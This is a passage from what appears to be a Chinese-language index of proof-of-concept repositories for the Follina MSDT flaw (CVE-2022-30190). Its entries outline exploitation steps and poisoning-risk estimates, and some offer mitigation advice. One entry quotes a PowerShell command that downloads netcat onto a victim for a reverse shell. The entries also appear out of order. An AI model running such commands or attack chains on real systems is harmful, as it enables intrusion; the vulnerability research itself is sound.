**影响版本:** 受影响的Windows版本包括Windows 7到Windows 11以及多个Windows Server版本，具体版本范围参考漏洞库信息。

**利用条件:** 需要用户打开包含恶意代码的文档（如Word文档），或者访问包含恶意链接的网页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以利用此漏洞，通过构造恶意的Word文档或其他方式，诱使用户打开，从而在用户系统上执行任意代码。 

**有效性评估：**

根据漏洞库信息和搜索结果，此漏洞在野外被广泛利用，POC代码的存在进一步证明了其有效性。提供的PoC代码描述了如何生成一个包含恶意链接的Word文档，当用户打开此文档时，MSDT会被调用，执行攻击者预先设定的恶意代码。

**投毒风险评估：**

分析提供的PoC代码，投毒风险较低，约为10%。主要风险点可能存在于以下几个方面：

1.  **init.py:** 该脚本用于构建恶意Word文档和初始化攻击者服务器。代码本身没有明显的恶意行为，但如果`build_payload`函数中的powershell命令被替换为更具破坏性的命令，则可能导致更严重的后果。
2.  **config.xml:** 该配置文件定义了攻击者服务器的主机名和端口。如果攻击者将此值更改为指向恶意服务器，则可能导致受害者下载和执行恶意软件。
3.  **build/href.txt:** 该文件包含用于触发漏洞的HTML代码。攻击者可能会修改此文件，以执行其他恶意操作。

但是，总体而言，提供的PoC代码主要用于演示漏洞，而不是用于传播恶意软件。 `destroy_all.bat`脚本的存在也一定程度上降低了风险，因为该脚本可以帮助用户删除所有相关文件。

**利用方式分析：**

1.  攻击者首先编辑`config.xml`，设置攻击者服务器的hostname和port。
2.  运行`dotnet publish LocalEXF`编译payload。
3.  运行`init.py`脚本，该脚本会：
    *   构建包含恶意链接的Word文档（trojan.docx）。
    *   在攻击者服务器上托管一个包含恶意Payload的HTML文件。
    *   base64 编码 PowerShell 命令。
4.  攻击者将此Word文档发送给受害者。
5.  受害者打开Word文档，MSDT会被调用，执行攻击者服务器上托管的Payload，从而在受害者系统上执行任意代码。

需要注意的是，要成功利用此漏洞，受害者需要卸载安全更新KB5016616，并且命令运行时间要短，否则会出现故障排除程序。


**项目地址:** [winstxnhdw/CVE-2022-30190](https://github.com/winstxnhdw/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #32

**来源**: [CVE-2022-30190-yeep1115_ICT287_CVE-2022-30190_Exploit.md](../2022/CVE-2022-30190-yeep1115_ICT287_CVE-2022-30190_Exploit.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的Windows版本和Office版本见漏洞库信息

**利用条件:** 需要用户打开恶意Word文档

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个远程代码执行漏洞，存在于Microsoft Windows Support Diagnostic Tool (MSDT)中。攻击者可以利用此漏洞通过特制的Word文档，使用Word的远程模板功能从远程Web服务器检索HTML文件，从而在受害者系统上执行任意代码。

**有效性：** 根据漏洞信息、搜索结果和提供的POC代码，该漏洞利用是有效的。漏洞库信息和搜索结果都表明这是一个真实存在的、被广泛利用的漏洞。POC代码（虽然只是一个README.md文件）指向了一个实际的利用项目，说明了利用方式和受影响的系统版本，证明了漏洞的可利用性。

**投毒风险：** 分析提供的仓库内容，风险评估如下：

*   **README.md文件：** 本身不包含任何可执行代码，因此直接的投毒风险较低。
*   **外部链接：**  主要风险在于指向的`Hrishikesh7665/Follina_Exploiter_CLI`仓库。虽然原作者注明了License，但是仍然存在投毒的可能性。

综合分析，考虑到代码仓库可能存在恶意修改的风险，虽然直接投毒可能性较低，但间接风险不可忽视，因此评估投毒风险为10%。

**利用方式：** 漏洞的利用方式通常包括以下步骤：

1.  **构造恶意Word文档：** 攻击者创建一个包含恶意链接的Word文档。该链接指向一个由攻击者控制的远程Web服务器，并使用`ms-msdt:` URL协议调用MSDT。
2.  **诱骗受害者打开文档：** 攻击者通过电子邮件、社交媒体或其他方式将恶意文档发送给受害者。
3.  **执行恶意代码：** 当受害者打开文档时，Word会尝试从远程服务器检索HTML文件。该HTML文件包含恶意JavaScript代码，该代码利用MSDT执行任意命令。
4.  **控制系统：** 通过执行的命令，攻击者可以在受害者系统上安装恶意软件、窃取数据或执行其他恶意活动。

**项目地址:** [yeep1115/ICT287_CVE-2022-30190_Exploit](https://github.com/yeep1115/ICT287_CVE-2022-30190_Exploit)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #33

**来源**: [CVE-2022-30190-yrkuo_CVE-2022-30190.md](../2022/CVE-2022-30190-yrkuo_CVE-2022-30190.md)

# CVE-2022-30190

> 📦 该CVE有 **33** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2022-30190-AbdulRKB_Follina.md](../2022/CVE-2022-30190-AbdulRKB_Follina.md)

## CVE-2022-30190 - Microsoft MSDT RCE (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，完全控制受害者系统

**影响版本:** 见漏洞库信息中受影响的版本

**利用条件:** 用户需要打开恶意构造的文档（例如 Word 文档）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190 (Follina) 是一个 Microsoft Office 中的远程代码执行漏洞，当 MSDT 通过 URL 协议从调用应用程序（如 Word）调用时，会触发此漏洞。攻击者可以利用 Word 的远程模板功能从远程 Web 服务器检索 HTML 文件。该HTML文件中包含恶意的JavaScript代码，该代码使用`ms-msdt:`协议调用MSDT，从而执行任意命令。

**利用方式:**

1.  **恶意文档制作:** 攻击者创建一个恶意的 Word 文档，该文档包含指向远程 Web 服务器的链接，该服务器托管着包含恶意 JavaScript 代码的 HTML 文件。
2.  **HTTP服务器:** 攻击者搭建一个 HTTP 服务器，用于托管恶意的 HTML 文件，该文件利用 `ms-msdt:` 协议执行命令。
3.  **诱骗用户打开文档:** 攻击者通过鱼叉式网络钓鱼等方式诱骗受害者打开恶意 Word 文档。
4.  **远程代码执行:** 当用户打开文档时，Word 会从远程服务器检索 HTML 文件，并执行其中的恶意 JavaScript 代码，从而触发 MSDT 并执行攻击者预设的命令。

**POC代码分析:**

提供的 POC 代码 `main.py` 脚本的功能如下:

*   **创建恶意文档：** 该脚本会修改 Word 文档的 `_rels/document.xml.rels` 文件，插入一个指向攻击者控制的 HTTP 服务器的链接。当用户打开该文档时，Word 会尝试从该链接下载 HTML 文件。
*   **启动 HTTP 服务器：** 该脚本会在指定的端口启动一个 HTTP 服务器，用于托管包含恶意 JavaScript 代码的 HTML 文件。该 HTML 文件使用 `ms-msdt:` 协议执行命令。
*   **启动 Netcat 监听器：** 该脚本会启动一个 Netcat 监听器，等待受害者机器反弹 shell。

**投毒风险分析:**

分析POC代码，发现以下潜在的投毒风险点:

*   **硬编码的下载地址：**  `Invoke-WebRequest https://github.com/CyberTitus/Follina/raw/main/nc64.exe -OutFile C:\Windows\Tasks\nc.exe`  这行代码从GitHub下载 `nc64.exe`  (Netcat) 到受害者机器。攻击者可能替换 CyberTitus 仓库中的 `nc64.exe` 文件，导致受害者下载恶意的 Netcat 版本或其他恶意程序。
*   **命令混淆与执行:** 恶意命令通过base64编码后执行，具有一定的隐藏性。如果攻击者将命令修改为具有破坏性的操作，则会存在较高的安全风险。
*   **Shell反弹地址:**虽然IP由用户输入，但代码逻辑存在被篡改的风险，从而反弹Shell到攻击者指定的地址。

**有效性:**

根据漏洞库信息、搜索引擎结果以及提供的 POC 代码，该漏洞利用的有效性较高。该漏洞在野外被广泛利用，且 POC 代码能够成功触发漏洞并实现远程代码执行。

**项目地址:** [AbdulRKB/Follina](https://github.com/AbdulRKB/Follina)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #2

**来源**: [CVE-2022-30190-Arkha-Corvus_LetsDefend-SOC173-Follina-0-Day-Detected.md](../2022/CVE-2022-30190-Arkha-Corvus_LetsDefend-SOC173-Follina-0-Day-Detected.md)

## CVE-2022-30190 - Microsoft MSDT 远程代码执行漏洞 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可导致远程代码执行，权限提升

**影响版本:** 受影响的Windows版本请参考漏洞库信息

**利用条件:** 用户打开恶意Word文档

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

该漏洞允许攻击者通过特制的Office文档，利用`ms-msdt:`协议调用MSDT执行任意命令。攻击者可以通过嵌入恶意URL到Word文档中，诱导用户点击或者预览，从而触发漏洞。漏洞利用流程如下：

1.  攻击者创建一个包含恶意链接的Word文档。
2.  用户打开该文档。
3.  文档利用`ms-msdt:`协议调用MSDT。
4.  MSDT执行攻击者指定的命令。

根据提供的漏洞利用代码分析，这是一个对 Follina 漏洞的案例研究，通过分析恶意Word文档触发 `msdt.exe` 的执行，从而实现远程代码执行。

**有效性：** 提供的Github仓库包含对漏洞的分析和利用过程，可以有效帮助理解漏洞原理。

**投毒风险：** 该存储库是一个案例分析，主要包含漏洞分析和利用过程的记录，包括文件哈希、网络流量分析和电子邮件分析。代码中没有发现明显的恶意后门代码，投毒的可能性较低（约5%），主要是考虑到作者可能在分析过程中引入了一些未知的或者不安全的操作，但从整体上看，这是一个漏洞分析的记录，投毒的可能性不大。

**利用方式：**

1.  **构造恶意Word文档：** 攻击者构造包含恶意`ms-msdt:` URL的Word文档。
2.  **传播恶意文档：** 攻击者通过钓鱼邮件等方式将恶意文档发送给目标用户。
3.  **触发漏洞：** 用户打开恶意文档，触发MSDT执行恶意代码。
4.  **执行恶意命令：** 攻击者利用MSDT执行任意命令，例如安装恶意软件，窃取数据等。

**建议：**

*   及时安装微软发布的补丁。
*   禁用`ms-msdt:`协议，作为缓解措施。
*   加强用户安全意识培训，避免打开来源不明的文档。
*   使用杀毒软件和入侵检测系统，及时发现和阻止恶意攻击。

**项目地址:** [Arkha-Corvus/LetsDefend-SOC173-Follina-0-Day-Detected](https://github.com/Arkha-Corvus/LetsDefend-SOC173-Follina-0-Day-Detected)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #3

**来源**: [CVE-2022-30190-Cosmo121_Follina-Remediation.md](../2022/CVE-2022-30190-Cosmo121_Follina-Remediation.md)

## CVE-2022-30190 - Microsoft MSDT "Follina" 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 见漏洞库信息中的受影响版本列表

**利用条件:** 需要用户打开恶意文档(如Word)或点击恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-30190 (Follina) 是一个存在于 Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以利用 Word 等调用应用程序，通过 URL 协议调用 MSDT，从而执行任意代码。利用方式通常是攻击者制作包含恶意代码的 Word 文档，该文档利用 Word 远程模板功能从远程 Web 服务器检索 HTML 文件，该 HTML 文件包含触发 MSDT 漏洞的代码，最终导致命令执行。

根据漏洞库信息，大量Windows版本都受到影响。搜索结果也证实了该漏洞的严重性，并提供了相关的利用和检测信息。提供的代码片段仅仅是GPL协议的License文件，并非POC代码，因此无法根据此代码判断投毒风险,需要验证是否存在后门。

由于提供的代码片段仅仅是GPL协议内容，无法判断实际的POC代码。根据搜索结果和漏洞描述，此漏洞的有效性高，因为在野外已经被利用。

**项目地址:** [Cosmo121/Follina-Remediation](https://github.com/Cosmo121/Follina-Remediation)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #4

**来源**: [CVE-2022-30190-DerZiad_CVE-2022-30190.md](../2022/CVE-2022-30190-DerZiad_CVE-2022-30190.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码，可能导致系统完全控制

**影响版本:** 受影响的Windows版本请参考漏洞库信息

**利用条件:** 需要用户打开包含恶意代码的文档，例如Word文档

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-30190 (Follina) 是一个远程代码执行漏洞，存在于 Microsoft Windows Support Diagnostic Tool (MSDT) 中。当 MSDT 被一个调用应用程序（例如 Microsoft Word）通过 URL 协议调用时，会触发此漏洞。攻击者可以通过构造一个包含恶意链接或嵌入恶意HTML的Word文档，诱使用户打开。当用户打开该文档时，MSDT 会尝试连接到攻击者控制的服务器，下载并执行恶意代码。

**漏洞利用方式：**

1.  攻击者创建一个包含恶意链接或嵌入恶意 HTML 的 Word 文档。
2.  该文档利用 Word 的远程模板功能，从远程 Web 服务器检索 HTML 文件。
3.  HTML 文件包含一个 `ms-msdt:` 协议处理程序的调用，该协议处理程序用于启动 MSDT。
4.  MSDT 执行 HTML 文件中指定的命令，从而允许攻击者执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞的PoC已经公开，且被积极利用。

**投毒风险：**

提供的漏洞利用代码仅包含 Apache 许可证，用于说明代码的使用条款，没有发现任何明显的恶意代码。因此，投毒风险较低，估计为 5%。但不能完全排除，因为攻击者可能会在其他相关组件中进行投毒，所以需要进一步分析依赖项才能彻底排除。

**排序优先级说明：**

此处遵循优先级的原则，搜索引擎结果用于确定漏洞的基本信息和利用方式。漏洞库信息用于确认受影响的版本和漏洞的严重程度。漏洞利用代码则用于评估投毒风险。

**项目地址:** [DerZiad/CVE-2022-30190](https://github.com/DerZiad/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #5

**来源**: [CVE-2022-30190-ErrorNoInternet_FollinaScanner.md](../2022/CVE-2022-30190-ErrorNoInternet_FollinaScanner.md)

## CVE-2022-30190 - Microsoft MSDT Follina 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可导致远程代码执行，完全控制受害者系统

**影响版本:** 受影响的Windows版本包括但不限于 Windows 7, Windows 8.1, Windows 10 (多个版本), Windows 11, Windows Server (多个版本)

**利用条件:** 用户需要打开包含恶意payload的文档（如Word文档），或点击恶意链接。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft支持诊断工具（MSDT）中的远程代码执行漏洞。攻击者可以利用此漏洞，通过调用应用程序（如Word）中的URL协议来执行任意代码，获得与该应用程序相同的权限。攻击者可以通过精心构造的恶意文档或链接，诱使用户打开，从而触发漏洞。

**漏洞利用方式：**

1.  攻击者创建一个包含恶意payload的文档（例如，一个包含远程模板的Word文档）。该模板指向一个由攻击者控制的服务器。
2.  当用户打开文档时，Word会尝试从远程服务器检索模板。
3.  远程服务器返回一个包含MSDT协议处理程序的HTML文件。
4.  MSDT通过URL协议被调用，并执行HTML文件中包含的恶意代码。

**POC代码分析：**
提供的代码 `FollinaScanner` 并非漏洞利用代码，而是一个用于扫描文件系统中可能包含Follina漏洞的文件的工具。 它通过搜索特定模式（例如，包含URL）的文件来工作。因此，提供的代码不能直接用于触发漏洞。

**投毒风险分析：**
  仓库主要功能是扫描本地文件是否存在漏洞，并没有实际利用漏洞的功能。 主要代码功能为扫描本地文件URL特征，判断本地是否存在恶意文件， 因此投毒风险较低。仓库中存在恶意代码的可能性极小，评估投毒风险约为1%。

**项目地址:** [ErrorNoInternet/FollinaScanner](https://github.com/ErrorNoInternet/FollinaScanner)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #6

**来源**: [CVE-2022-30190-Gra3s_CVE-2022-30190_EXP_PowerPoint.md](../2022/CVE-2022-30190-Gra3s_CVE-2022-30190_EXP_PowerPoint.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，控制受影响系统

**影响版本:** 受影响的Windows版本包括但不限于Windows 7、Windows 8.1、Windows 10、Windows 11、Windows Server 2008 R2、Windows Server 2012、Windows Server 2016、Windows Server 2019、Windows Server 2022等，具体版本范围见漏洞库信息。

**利用条件:** 需要用户打开包含恶意链接的文档（如Word、PowerPoint等），或者访问包含恶意链接的网页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。该漏洞允许攻击者通过构造恶意的文档，诱使用户打开，从而在受害者系统上执行任意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果和漏洞利用代码，该漏洞利用代码是有效的。搜索结果显示该漏洞已被积极利用，并且有公开的PoC代码。

**投毒风险：**
分析提供的PoC代码，`/tmp/b3fc53fc9d09e4a456a951f4bdd6f2bd/exploit.html` 文件看起来是一个无害的HTML文档，里面包含大量的Lorem Ipsum文本，但是攻击者可以通过 `slide1.xml.rels` 中插入恶意的url，从而执行恶意的payload。`/tmp/b3fc53fc9d09e4a456a951f4bdd6f2bd/README.md` 只是说明了如何修改`slide1.xml.rels` 文件的Target指向攻击者的服务器。

仓库中的投毒风险较低，主要风险在于payload本身可能被替换成恶意代码。但是，这个仓库本身的目的就是漏洞利用，使用者应该已经知晓其潜在的风险，并对下载的内容进行安全审查。因此, 投毒风险评定为10%。

**利用方式：**
1.  攻击者创建一个包含恶意链接的文档（例如，利用提供的PowerPoint PoC，将`.ppsx`文件解压，修改`ppt\slides\_rels\slide1.xml.rels`文件中的`Target`属性，指向攻击者控制的服务器上的`exploit.html`文件）。
2.  攻击者在自己的服务器上托管一个恶意的`exploit.html`文件，该文件包含用于触发MSDT漏洞的代码，并执行payload（默认payload是calc程序）。
3.  攻击者诱使用户打开该文档。
4.  当用户打开文档时，MSDT会尝试通过URL协议连接到攻击者的服务器，下载并执行恶意的`exploit.html`文件中的代码，从而在受害者系统上执行任意命令。

总的来说，该漏洞的利用依赖于社会工程学，诱使用户打开恶意文档。成功利用后，攻击者可以获得与当前用户相同的权限，从而控制受影响的系统。

**项目地址:** [Gra3s/CVE-2022-30190_EXP_PowerPoint](https://github.com/Gra3s/CVE-2022-30190_EXP_PowerPoint)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #7

**来源**: [CVE-2022-30190-Imeneallouche_Follina-attack-CVE-2022-30190-.md](../2022/CVE-2022-30190-Imeneallouche_Follina-attack-CVE-2022-30190-.md)

## CVE-2022-30190-Follina-MSDT远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可导致远程代码执行，控制受害者系统

**影响版本:** 受影响的Windows版本包括但不限于：Windows 7 SP1, Windows 8.1, Windows 10 (多个版本), Windows 11 21H2, Windows Server (多个版本)

**利用条件:** 用户需要打开恶意构造的Word文档或其他调用MSDT的应用程序

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个Microsoft Office中的远程代码执行漏洞。当MSDT通过URL协议被调用时，例如从Word等应用程序调用，就会存在此漏洞。攻击者可以利用Word的远程模板功能，从远程Web服务器检索HTML文件。该HTML文件包含恶意代码，可以绕过某些安全机制并执行任意命令。 

**漏洞利用方式：**

1.  **攻击者制作恶意Word文档：** 该文档包含指向远程服务器的链接，该服务器托管一个恶意的HTML文件。
2.  **用户打开恶意文档：** 当用户打开该文档时，Word会尝试从远程服务器加载HTML文件。
3.  **MSDT被调用并执行恶意代码：** HTML文件利用`ms-msdt:`协议触发MSDT执行，从而执行攻击者指定的命令。

**POC代码分析：**

提供的POC代码包含以下文件：

*   `README.md`: 描述了漏洞和攻击的简要信息。
*   `config.py`: 包含配置参数，例如要执行的命令 (`EXECUTED_COMMAND`)，输出文件名 (`OUTPUT_FILE`)，网络接口 (`NETWORK_INTERFACE`)，端口 (`PORT`)，以及是否使用反向shell (`REVERSE_PORT`)。
*   `manip_args.py`: 解析命令行参数，并准备利用所需的文件。此脚本负责创建临时目录，复制必要的文件，修改文档关系文件，并启动一个HTTP服务器来托管恶意HTML文件。
*   `requirements.txt`: 列出了POC所需的Python依赖项。
*   `utils.py`: 包含实用函数，例如启动HTTP服务器，检查IP和端口的可用性，以及准备恶意Word文档的函数。

**有效性：**

根据漏洞信息和POC代码，该漏洞利用是有效的。POC代码允许攻击者指定要执行的命令，并生成一个恶意的Word文档，该文档在打开时会触发漏洞并执行命令。

**投毒风险：**

该存储库的投毒风险较低，约10%。`config.py` 文件允许定义要执行的 `EXECUTED_COMMAND`，而 `manip_args.py` 会动态修改利用代码，这些地方可能存在潜在的恶意代码注入点。但是，总体来看，代码结构较为简单，功能明确，不易隐藏恶意代码。需要注意的是，使用任何漏洞利用代码都存在风险，需要仔细审查代码后再使用。此处的10%更多指的是一种不确定性风险的评估，需要人工代码审计来进行确认。

**项目地址:** [Imeneallouche/Follina-attack-CVE-2022-30190-](https://github.com/Imeneallouche/Follina-attack-CVE-2022-30190-)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #8

**来源**: [CVE-2022-30190-Jump-Wang-111_AmzWord.md](../2022/CVE-2022-30190-Jump-Wang-111_AmzWord.md)

## CVE-2022-30190 (Follina) - Microsoft MSDT 远程代码执行

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，系统控制，数据泄露

**影响版本:** 见漏洞库信息中受影响的版本列表

**利用条件:** 用户需要打开包含恶意链接或文档的应用程序（如 Microsoft Word）。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个存在于 Microsoft 支持诊断工具 (MSDT) 中的远程代码执行漏洞。攻击者可以利用此漏洞，通过诱骗用户打开包含恶意代码的文档（通常是 Word 文档），从而在受害者系统上执行任意代码。

**利用方式：**

1.  攻击者创建一个包含恶意链接或嵌入恶意 HTML 的文档 (例如, Word 文档)。该恶意 HTML 利用 `ms-msdt:` 协议处理程序调用 MSDT。
2.  当用户打开该文档时，MSDT 会被调用，并执行攻击者指定的代码。该代码可以下载并执行任意程序。
3.  提供的漏洞利用代码 (AmzWord) 自动化了此过程，集成了 CVE-2022-30190 漏洞利用、163 邮箱后门和图像隐写术。
4.  AmzWord 使用 `follina.py` 脚本生成恶意 Word 文件，并在本地启动 HTTP 服务器，用于提供恶意载荷。
5.  该漏洞利用代码还使用了 `gdog` 项目，这是一个基于邮件的远程控制工具，允许攻击者通过发送特定的命令邮件来控制受害者机器。

**有效性：**

根据漏洞库信息和搜索结果，CVE-2022-30190 是一个真实且已被积极利用的漏洞。提供的 POC 代码 (`AmzWord`) 旨在利用该漏洞，因此可以判断 POC 代码是有效的，前提是目标系统存在漏洞且未采取缓解措施。

**投毒风险：**

评估 POC 代码的投毒风险需要仔细审查代码，检查是否存在隐藏的、非预期的恶意行为。从描述来看,`AmzWord` 项目集成了多个组件，包括 `follina.py`（CVE-2022-30190 漏洞利用）和 `gdog`（基于邮件的远程控制工具）。 潜在的投毒风险可能存在于以下几个方面：

*   `gdog` 组件： `gdog` 项目本身可能包含后门或恶意功能，允许作者或其他人远程访问受感染的系统。由于该项目已经存在一段时间，并且经过修改以适应当前的攻击链，因此存在引入未经审查的恶意代码的风险。
*   配置信息泄露： POC需要用户填写邮箱的用户名和密码，存在泄露邮箱信息的风险
*   依赖关系： 该POC依赖多个第三方库，这些库可能存在安全漏洞或被篡改，从而导致意外行为。

综合来看，由于集成的复杂性和对外部组件的依赖，存在一定的投毒风险。`gdog` 组件尤其值得关注。 但从整个项目的设计来看，目标是实现一个完整的攻击链演示，作者隐藏恶意代码以达到其他目的的可能性较低，所以投毒的可能性相对较低。评估投毒风险的概率约为 10%。

**项目地址:** [Jump-Wang-111/AmzWord](https://github.com/Jump-Wang-111/AmzWord)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #9

**来源**: [CVE-2022-30190-Malwareman007_Deathnote.md](../2022/CVE-2022-30190-Malwareman007_Deathnote.md)

## CVE-2022-30190-Microsoft Windows MSDT 远程代码执行漏洞 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码，可能导致系统完全控制

**影响版本:** 见漏洞库信息中受影响的版本

**利用条件:** 用户需要打开一个恶意构造的文档（例如 Word 文档）。攻击者可以通过鱼叉式网络钓鱼活动传播恶意文档。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，也被称为“Follina”，是一个存在于 Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。 

**利用方式：**该漏洞通过以下方式利用：

1.  攻击者创建一个恶意 Word 文档或其他支持外部链接的文档。
2.  该文档包含一个指向远程服务器上 HTML 文件的链接，该链接使用 `ms-msdt:` 协议。
3.  当用户打开文档时，Word 会尝试检索该 HTML 文件。
4.  `ms-msdt:` 协议处理程序被调用，执行 HTML 文件中包含的恶意代码。
5.  攻击者通过精心构造的 HTML 文件，利用 MSDT 的漏洞执行任意命令。

**有效性：**根据提供的漏洞库信息和搜索结果，该漏洞已经过积极利用，且PoC 代码可用，因此可以判断提供的POC代码是有效的。

**投毒风险：**PoC代码中存在潜在的投毒风险的可能性较低，约为10%。 代码中，通过`Invoke-WebRequest`从GitHub下载`nc64.exe`可能存在风险，如果github仓库被污染，攻击者可以直接执行任意代码。其他的风险较低。

**项目地址:** [Malwareman007/Deathnote](https://github.com/Malwareman007/Deathnote)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #10

**来源**: [CVE-2022-30190-Muhammad-Ali007_Follina_MSDT_CVE-2022-30190.md](../2022/CVE-2022-30190-Muhammad-Ali007_Follina_MSDT_CVE-2022-30190.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者在受害者系统上执行任意代码

**影响版本:** 受影响的Windows版本请参考漏洞库信息

**利用条件:** 需要用户打开恶意Word文档或其他Office文档

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以构造恶意的Word文档，利用Word的远程模板功能从远程服务器检索HTML文件，HTML文件中包含的JavaScript代码通过`ms-msdt:` URI scheme调用MSDT，从而执行任意命令。

**有效性：**
提供的POC代码是有效的。它通过修改Word文档的`document.xml.rels`文件，将OLE对象引用指向攻击者控制的HTML文件。该HTML文件利用`ms-msdt:`协议执行PowerShell命令，从而实现远程代码执行。

**投毒风险：**
POC代码本身实现了漏洞利用，但作者可能在其他地方隐藏恶意代码。
*   **Readme.md 分析:**  Readme.md 主要提供漏洞描述和利用步骤，风险较低。
*   **follina.py 分析:**  `follina.py`脚本用于生成恶意文档，该脚本本身可能包含恶意代码，但是已知的该脚本的功能是创建利用payload的word文档，风险可控。评估投毒风险，基于现有信息，判断为10%的可能性，主要集中在提供的脚本是否存在未公开的后门。

**利用方式：**
1.  攻击者创建一个包含恶意OLE对象引用的Word文档（或其他Office文档）。
2.  该OLE对象引用指向攻击者控制的远程HTML文件。
3.  当用户打开该文档时，Word会尝试从远程服务器加载HTML文件。
4.  HTML文件中的JavaScript代码使用`ms-msdt:` URI scheme调用MSDT。
5.  MSDT执行HTML文件中指定的PowerShell命令，从而导致远程代码执行。

漏洞利用的关键在于`ms-msdt:`协议的使用，以及Word文档对远程OLE对象的支持。通过精心构造的HTML文件和Word文档，攻击者可以绕过安全防护措施，在受害者系统上执行任意代码。

**项目地址:** [Muhammad-Ali007/Follina_MSDT_CVE-2022-30190](https://github.com/Muhammad-Ali007/Follina_MSDT_CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #11

**来源**: [CVE-2022-30190-Nyx2022_Follina-CVE-2022-30190-Sample.md](../2022/CVE-2022-30190-Nyx2022_Follina-CVE-2022-30190-Sample.md)

## CVE-2022-30190 - Microsoft MSDT 'Follina' 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的Windows版本众多，具体版本范围请参考漏洞库信息

**利用条件:** 用户需要打开恶意文档或点击恶意链接，触发MSDT通过URL协议调用

